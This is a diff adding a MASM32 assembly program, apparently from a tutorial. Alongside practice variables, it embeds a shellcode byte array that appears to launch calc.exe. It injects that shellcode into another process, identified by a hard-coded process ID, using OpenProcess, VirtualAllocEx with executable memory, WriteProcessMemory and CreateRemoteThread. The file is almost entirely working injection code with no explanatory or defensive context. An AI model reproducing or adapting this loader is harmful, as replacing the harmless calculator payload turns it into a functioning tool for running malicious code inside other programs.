@@ -1,0 +1,107 @@
+
+.386
+.model flat, stdcall
+.stack 8192
+
+include \masm32\include\masm32rt.inc
+include \masm32\include\masm32.inc
+include \masm32\include\kernel32.inc
+include \masm32\include\user32.inc
+includelib \masm32\lib\masm32.lib
+includelib \masm32\lib\kernel32.lib
+includelib \masm32\lib\user32.lib
+
+
+.data
+	PIZZA = 12
+	BURGER = 100
+
+	age DWORD 22  ;4000 
+	prices DWORD 1,2,3,4,5,6,7  ; 4003
+	priceslen DWORD ($-prices)/TYPE prices ; 4023
+	t DWORD TYPE prices
+	temp DWORD OFFSET prices
+	name1 BYTE "tech69",
+	" youtuber",0
+	namelen DWORD LENGTHOF name1
+	tsize DWORD SIZEOF name1
+	;name1len DWORD ($-name1)/TYPE name1
+	array1 DWORD 66,70,12,
+		100,200,300,500,400
+	array1len DWORD LENGTHOF array1
+	;array1len DWORD ($-array1)/TYPE array1
+	index1 DWORD 0
+	index2 DWORD ?
+	outwritten DWORD ?
+	baseaddress DWORD ?
+	phandle DWORD ?
+	shellcode BYTE 0fch,0e8h,082h,000h,000h,000h,060h,089h,0e5h,031h,0c0h,064h,08bh,050h,030h
+	shellcode2 BYTE 08bh,052h,00ch,08bh,052h,014h,08bh,072h,028h,00fh,0b7h,04ah,026h,031h,0ffh
+	shellcode3 BYTE 0ach,03ch,061h,07ch,002h,02ch,020h,0c1h,0cfh,00dh,001h,0c7h,0e2h,0f2h,052h
+	shellcode4 BYTE 057h,08bh,052h,010h,08bh,04ah,03ch,08bh,04ch,011h,078h,0e3h,048h,001h,0d1h
+	shellcode5 BYTE 051h,08bh,059h,020h,001h,0d3h,08bh,049h,018h,0e3h,03ah,049h,08bh,034h,08bh
+	shellcode6 BYTE 001h,0d6h,031h,0ffh,0ach,0c1h,0cfh,00dh,001h,0c7h,038h,0e0h,075h,0f6h,003h
+	shellcode7 BYTE 07dh,0f8h,03bh,07dh,024h,075h,0e4h,058h,08bh,058h,024h,001h,0d3h,066h,08bh
+	shellcode8 BYTE 00ch,04bh,08bh,058h,01ch,001h,0d3h,08bh,004h,08bh,001h,0d0h,089h,044h,024h
+	shellcode9 BYTE 024h,05bh,05bh,061h,059h,05ah,051h,0ffh,0e0h,05fh,05fh,05ah,08bh,012h,0ebh
+	shellcode10 BYTE 08dh,05dh,06ah,001h,08dh,085h,0b2h,000h,000h,000h,050h,068h,031h,08bh,06fh
+	shellcode11 BYTE 087h,0ffh,0d5h,0bbh,0e0h,01dh,02ah,00ah,068h,0a6h,095h,0bdh,09dh,0ffh,0d5h
+	shellcode12 BYTE 03ch,006h,07ch,00ah,080h,0fbh,0e0h,075h,005h,0bbh,047h,013h,072h,06fh,06ah
+	shellcode13 BYTE 000h,053h,0ffh,0d5h,063h,061h,06ch,063h,02eh,065h,078h,065h,000h
+
+	shellcodelength DWORD ($-shellcode)/TYPE shellcode
+	threadid DWORD 0
+
+.code
+main PROC
+	
+	push 1348
+	push 0
+	push 001FFFFFh 
+	call OpenProcess
+	mov phandle,eax
+
+
+	;virtualallocex
+	push 40h
+	push 3000h
+	push shellcodelength
+	push 0
+	push phandle
+	call VirtualAllocEx
+	mov baseaddress , eax
+
+	; writeprocessmemory
+	push offset outwritten
+	push shellcodelength
+	push offset shellcode
+	push baseaddress
+	push phandle
+	call WriteProcessMemory
+
+
+
+	;createremotethread
+	push offset threadid
+	push 0
+	push 0
+	push baseaddress
+	push 0
+	push 0
+	push phandle
+	call CreateRemoteThread
+
+
+	; close handle
+	push phandle
+	call CloseHandle
+
+
+	nop
+	
+exit1:
+	push 0
+	call ExitProcess
+
+main ENDP
+end main
